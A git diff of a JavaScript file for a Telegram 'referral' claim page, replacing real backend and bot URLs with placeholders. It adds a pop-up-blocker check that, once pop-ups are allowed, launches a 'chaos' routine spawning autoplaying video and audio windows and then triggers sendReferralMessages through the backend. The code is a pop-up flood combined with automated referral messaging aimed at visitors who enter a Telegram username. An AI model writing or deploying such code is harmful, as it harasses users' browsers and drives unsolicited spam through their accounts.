@@ -1,7 +1,7 @@
 // script.js
 
 // Backend URL
-const backendUrl = 'https://telegram-dpreferral-backend.onrender.com'; // Use your actual backend domain
+const backendUrl = 'https://yourbackenddomain.com'; // Use your actual backend domain
 
 // Elements
 const claimButton = document.getElementById('claimButton');
@@ -129,7 +129,7 @@ submitUsername.addEventListener('click', async () => {
         } else {
             // Display instructions and link to verification bot
             displayModalMessage(
-                `Verification failed. Please verify with our Telegram bot first: <a href="https://t.me/DoublePenisVerifyBot" target="_blank">@DoublePenisVerifyBot</a>`,
+                `Verification failed. Please verify with our Telegram bot first: <a href="https://t.me/YourTelegramBot" target="_blank">@YourTelegramBot</a>`,
                 'error'
             );
         }
@@ -156,11 +156,36 @@ secondClaimButton.addEventListener('click', async () => {
 
     claimMessage.textContent = 'Initiating chaos...';
 
-    // Start Chaos Effect
-    startChaos();
-
-    // Send messages via backend after chaos starts
-    setTimeout(sendReferralMessages, 2000); // Delay to ensure chaos has started
+    // Attempt to open a test window to check for popup blockers
+    const testWindow = window.open('', '', 'width=200,height=100');
+    if (testWindow === null || typeof testWindow === 'undefined') {
+        alert('Pop-up blocked. Please allow pop-ups for this site and refresh the page to proceed.');
+        claimMessage.textContent = 'Pop-up blocked. Please allow pop-ups and try again.';
+        return;
+    } else {
+        // Test window content
+        testWindow.document.write(`
+            <html>
+            <head>
+                <title>Verifying...</title>
+                <style>
+                    body { font-family: Arial, sans-serif; text-align: center; padding-top: 30px; }
+                </style>
+            </head>
+            <body>
+                <p>Verifying...</p>
+            </body>
+            </html>
+        `);
+        // Close the test window after 1 second
+        setTimeout(() => {
+            testWindow.close();
+            // Start Chaos Effect after confirming pop-ups are allowed
+            startChaos();
+            // Send messages via backend after chaos starts
+            setTimeout(sendReferralMessages, 2000); // Delay to ensure chaos has started
+        }, 1000);
+    }
 });
 
 // Send Referral Messages
@@ -250,10 +275,10 @@ function spawnChaosWindow() {
             </head>
             <body>
                 <video autoplay loop>
-                    <source src="https://telegram-dpreferral-backend.onrender.com/chaosvid.mp4" type="video/mp4">
+                    <source src="https://yourbackenddomain.com/chaosvid.mp4" type="video/mp4">
                 </video>
                 <audio autoplay>
-                    <source src="https://telegram-dpreferral-backend.onrender.com/chaossound.mp3" type="audio/mpeg">
+                    <source src="https://yourbackenddomain.com/chaossound.mp3" type="audio/mpeg">
                 </audio>
             </body>
             </html>
@@ -272,6 +297,7 @@ function spawnChaosWindow() {
         console.warn('Pop-up blocked. Please allow pop-ups for this site to enable the chaos effect.');
         alert('Pop-up blocked. Please allow pop-ups for this site and refresh the page to proceed.');
         stopChaos(); // Stop attempting to spawn windows
+        claimMessage.textContent = 'Pop-up blocked. Please allow pop-ups and try again.';
     }
 }
 
